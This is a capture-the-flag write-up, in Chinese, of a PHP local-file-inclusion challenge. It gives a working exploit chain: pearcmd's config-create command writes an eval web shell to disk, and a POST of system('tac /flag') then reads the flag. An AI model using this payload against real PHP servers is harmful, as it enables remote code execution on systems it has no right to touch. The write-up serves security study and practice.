### Include 🍐

---

```php
<?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```

提示需要查看一下phpinfo，直接传入参数  `?file=phpinfo`

![image-20240910215821991](https://gitee.com/bx33661/image/raw/master/path/image-20240910215821991.png)

看到这里其实我没有什么思路，看了wp之后发现可以使用`pear.php`这个思路，

*register_argc_argv* 这个还有题目名字就是最典型的提示

> pear全称PHP Extension and Application Repository，php扩展和应用仓库，在docker中默认安装，路径为/user/local/lib/php.
>
> 前提需要：`register_argc_argv` 是 `on`

```php
?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>+shel.php
    
//由于$_SERVER['argv']变量会将URL的?后面的值都传入pear当作参数，所以此处file需要调换一下位置，并且在适当位置加上/和空格的url编码
```

- `?+config-create+/`

> pear工具里有一个命令叫:config-create,这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。

- `&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST['cmd']);?>`

第一个参数写入

- `shel.php`

第二个参数是写入路径

![image-20240910222612381](https://gitee.com/bx33661/image/raw/master/path/image-20240910222612381.png)

利用POST传参数

```php
cmd=system('tac /flag');
```

![image-20240910222457517](https://gitee.com/bx33661/image/raw/master/path/image-20240910222457517.png)

得到flag





### 参考文档

https://juejin.cn/post/7147638903191814180